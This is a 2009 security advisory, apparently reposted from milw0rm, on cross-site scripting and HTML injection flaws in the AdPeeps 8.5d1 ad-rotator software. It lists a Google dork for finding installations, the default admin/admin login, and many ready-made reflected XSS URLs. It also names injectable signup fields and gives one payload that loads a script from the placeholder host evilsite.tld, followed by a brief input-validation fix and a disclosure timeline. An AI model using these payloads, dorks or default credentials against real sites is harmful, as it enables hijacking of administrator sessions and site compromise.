@@ -1,0 +1,129 @@
+AdPeeps Ad Rotator - XSS and HTML Injection Vulnerabilities
+
+Version Affected: 8.5d1 (3-18-09) (newest)
+
+Info: Ad Peeps is a banner rotator and text ad rotator - all in one that
+allows you to track, sell and manage   banner ads, rich-media/flash ads 
+and  text ads on your website. Built using PHP/MYSQL, Ad Peeps provides
+you and your advertisers with highly detailed real-time statistics and
+is capable of delivering millions of impressions per day on a typical
+shared web server. -  Plus, you can try it right now on your website
+with our 7 day trial.
+
+Ad Peeps is so versatile that it can even show your text ads Yahoo!
+Style or Google AdWords Style. Unlike many other banner ad rotator
+programs, Ad Peeps was skillfully designed to use minimal server
+resources while maintaining speed and unparalleled performance. Built on
+a highly scalable and versatile database architecture, Ad Peeps works
+without fuss even on high traffic web sites and won't crash your high
+powered website..
+
+Opinion: AdPeeps, along with many others should really hire people to
+audit their code.
+
+Credits: Matt and all of InterN0T :-)
+
+Googled0rk: (there might be more accurate d0rks)
+intitle:"Advertisement Management Control Panel"
+
+External Links:
+http://www.adpeeps.com/
+http://www.adpeeps.com/signup.html
+http://demo.adpeeps.com/index.php?loc=adminlogin&uid=100000
+
+Default Login:
+admin / admin
+
+-:: The Advisory ::-
+
+Version Information:
+http://www.website.tld/adpeeps/index.php?loc=adminlogin&uid=100000
+
+Information Disclosure: (discloses the full path to the file)
+http://www.website.tld/adpeeps/index.php?loc=view_adrates&uid=SomeRandomString
+
+Vulnerable Function / ID Calls: (XSS)
+uid, campainid, type, period, loginpass, accname, e9, from, subject & idno
+
+Possible Filtered / Bad Chars: ' (quotes are semi-filtered too with a \
+prepended, however this does not prevent XSS from being executed)
+
+Cross Site Scripting: ( "><script>alert(0)</script> )
+http://www.website.tld/adpeeps/index.php?uid="><script>alert(0)</script>
+http://www.website.tld/adpeeps/index.php?loc=login_lookup&uid="><script>alert(0)</script>
+http://www.website.tld/adpeeps/index.php?loc=adminlogin&uid="><script>alert(0)</script>
+http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=new&uid=100000&campaignid="><script>alert(0)</script>
+http://www.website.tld/adpeeps/index.php?loc=view_account_stats&uid=100000&type="><script>alert(2)</script>&period="><script>alert(1)</script>
+http://www.website.tld/adpeeps/index.php?loc=view_adrates&uid="><script>alert(0)</script>
+http://www.website.tld/adpeeps/index.php?loc=account_confirmation&accname="><script>alert(1)</script>&loginpass="><script>alert(2)</script>&uid=100000
+http://www.website.tld/adpeeps/index.php?loc=setup_account&e6=new&e12=bypass&e9="><script>alert(0)</script>
+http://www.website.tld/adpeeps/index.php?loc=email_advertisers&uid=100000&mode=1&errors=&from="><script>alert(1)</script>&message=&subject="><script>alert(2)</script>
+http://www.website.tld/adpeeps/index.php?loc=edit_ad_package&uid=100000&idno="><script>alert(0)</script>
+-- The Cross Site Scripting will most likely not survive any logins from what our research results showed.
+
+Affected Fields in the Signup Formular by HTML Injection:
+- Advertiser Name
+- First Name
+- Last Name
+- *Advertiser E-Mail
+- Address
+- Phone Number
+- Password Hint
+- URL to goto on click
+*Was not tested but might be vulnerable.
+
+Avoid HTML Injection In: (these fields gets sent to the administrator by e-mail)
+Advertiser Name
+First & Last Name
+Advertiser E-mail
+
+HTML Injection: : (insert: "><script>alert(0)</script> into the mentioned forms)
+http://www.website.tld/adpeeps/index.php?loc=view_adrates&uid=100000
+- One will have to buy a user / ad-spot in order to exploit this issue.
+
+Affected Sites by HTML Injection: (where Advertiser Name, First- and Last-name isn't used)
+http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=edit&uid=100000&campaignid=VALIDID (phone and passhint)
+http://www.website.tld/adpeeps/index.php?loc=view_campaign_stats&uid=100000&campaignid=VALIDID (address and phone)
+http://www.website.tld/adpeeps/index.php?loc=view_ad_stats&uid=100000&campaignid=VALIDID&adno=VALIDID (ad url)
+http://www.website.tld/adpeeps/index.php?loc=createadvertad&campaignid=VALIDID&uid=100000&adno=VALIDID&adtype=banner (ad url)
+
+Affected Sites by HTML Injection: (where advertiser name is used)
+http://www.website.tld/adpeeps/index.php?loc=view_account_stats&uid=100000&type=overall&period=all
+http://www.website.tld/adpeeps/index.php?loc=mass_update_target_weight&uid=100000
+http://www.website.tld/adpeeps/index.php?loc=orderhistory&uid=100000
+http://www.website.tld/adpeeps/index.php?loc=email_advertisers&uid=100000&mode=1&errors=&from=&message=&subject=
+http://www.website.tld/adpeeps/index.php?loc=campaignview&uid=100000&messagecode=void
+http://www.website.tld/adpeeps/index.php?loc=previouslydeleted&uid=100000 << Only when the Admin has deleted the user and looks at this page!
+http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=edit&uid=100000&campaignid=VALIDID
+http://www.website.tld/adpeeps/index.php?loc=view_campaign_stats&uid=100000&campaignid=VALIDID
+
+Affected Sites by HTML Injection: (which requires abnormal injection. (the common alert(0) did not work))
+http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=edit&uid=100000&campaignid=VALIDID (first- and/or last-name)
+http://www.website.tld/adpeeps/index.php?loc=email_advertisers&uid=100000&mode=1&errors=&from=&message=&subject= (first- and/or last-name)
+http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=edit&uid=100000&campaignid=VALIDID (first- and/or last-name)
+http://www.website.tld/adpeeps/index.php?loc=view_campaign_stats&uid=100000&campaignid=VALIDID (first- and/or last-name)
+The above "abnormal" injection we tested with was: "></td></tr></table><SCRIPT SRC=http://evilsite.tld/xss.js></SCRIPT><!--
+
+
+-:: Solution ::-
+The most easy solution is to validate user input and strip or convert
+bad / html characters.
+
+Conclusion:
+Even if One decides to (ab)use the Advertiser Name, First- and
+Last-name's as injection points and the administrator sees this (in an
+e-mail), then he will still be affected by the injection and possibly
+have a hard time deleting those malicious users safely except if he
+might have NoScript turned on for his own website. (the injection points
+might render the desired pages useless)
+
+Reference:
+http://forum.intern0t.net/exploits-vulnerabilities-pocs/1049-intern0t-adpeeps-8-5d1-cross-site-scripting-html-injection-vulnerabilities.html
+
+Disclosure Information:
+- Vulnerabilities found 26th May 2009.
+- Advisory finished and published on InterN0T the 27th May.
+- Bugtraq (SecurityFocus) and Milw0rm contacted the 27th May.
+* AdPeeps will be contacted soon. (full disclosure rocks!)
+
+# milw0rm.com [2009-05-27]
